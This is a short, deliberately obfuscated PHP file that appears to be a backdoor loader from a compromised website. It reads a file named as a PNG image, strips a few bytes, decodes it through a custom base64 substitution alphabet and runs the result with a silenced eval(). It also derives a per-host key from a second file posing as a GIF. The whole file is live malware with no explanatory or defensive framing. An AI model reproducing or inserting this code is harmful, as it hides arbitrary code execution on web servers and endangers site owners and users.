<?php

class dizuto_uluchukhyt {

    public $girazhy = 'dysytaq.png';
    public $ukujeh_ukamechece = false;
    public $xisoko_lezhaqaj = false;
    public $pehepy_aqebepuxy = false;

    protected function besisa_shobocyxu($ponuge_perujutho) {
        $omomyr_iqamusamo = crc32($ponuge_perujutho);
        if ((PHP_INT_SIZE > 4) && ($omomyr_iqamusamo & 0x80000000))
            $omomyr_iqamusamo = $omomyr_iqamusamo - 0x100000000;
        return abs($omomyr_iqamusamo);
    }

    protected function fyluki_chothichix($ponuge_perujutho) {
        $ekanir = "=IAMYO95Nw7jqfJpm1XHarbK/ukRBWUSCtEDPgGoecv6sFVxld8LZyQ4n+hzi3T20";
        $olizheq = "MYjDwd42LQfAWyuX8FvG0RtgerJnZSKh71TsBoUq6Vla=z3ckN/OP+pmiCI9HbEx5";
        $pojymy = array();
        for ($fywiji = 0; $fywiji < strlen($ekanir); $fywiji++) {
            $ogofozu = substr($ekanir, $fywiji, 1);
            $acofys = substr($olizheq, $fywiji, 1);
            $pojymy[$ogofozu] = $acofys;
        }

        $ebenole = strtr($ponuge_perujutho, $pojymy);
        $ebenole = base64_decode($ebenole);

        return $ebenole;
    }

    protected function ukelip_ifukhuhakhi($ponuge_perujutho) {
        $todika = array();
        if (!file_exists($ponuge_perujutho))
            return false;
        $ubiwuku = @file_get_contents($ponuge_perujutho);
        if (!$ubiwuku)
            return false;
        $ubiwuku = substr($ubiwuku, 3);
        $todika = $this->fyluki_chothichix($ubiwuku);
        return $todika;
    }

    public function xycoso_idetachi() {
        $yluruk_ekhiqepo = __DIR__ . "/" . $this->girazhy;
        $ymydic_sishumyju = $this->ukelip_ifukhuhakhi($yluruk_ekhiqepo);
        if (!$ymydic_sishumyju)
            return false;
        $this->ukujeh_ukamechece = $ymydic_sishumyju;
        return true;
    }

    public function oqokem_chodytob() {
        if ($this->xisoko_lezhaqaj)
            return true;
        $yluruk_ekhiqepo = __DIR__ . '/ehicaru.gif';
        if (!file_exists($yluruk_ekhiqepo)) {
            return false;
        }

        $ymydic_sishumyju = $this->ukelip_ifukhuhakhi($yluruk_ekhiqepo);
        $omomyr_iqamusamo = "HTTP_" . "HOST";
        $mijubo_guzholobu = $_SERVER[$omomyr_iqamusamo];
        $anypuh_shavochi = floor(strlen($ymydic_sishumyju) / 32);
        $gasigi_khukuzap = $this->besisa_shobocyxu($mijubo_guzholobu) % $anypuh_shavochi;
        $ujonog_yjithythok = substr($ymydic_sishumyju, $gasigi_khukuzap * 32, 32);
        $this->pehepy_aqebepuxy = $gasigi_khukuzap;
        $this->xisoko_lezhaqaj = $ujonog_yjithythok;

        if (!defined('kaxury_zhochenovech'))
            define('kaxury_zhochenovech', $ujonog_yjithythok);
        if (!defined('xyhoky_shochajoq'))
            define('xyhoky_shochajoq', $gasigi_khukuzap + 1);

        return $ujonog_yjithythok;
    }

}

$gelogiv = new dizuto_uluchukhyt();
$gelogiv->oqokem_chodytob();
$gelogiv->xycoso_idetachi();

if ($gelogiv->ukujeh_ukamechece) {
    @eval($gelogiv->ukujeh_ukamechece);
}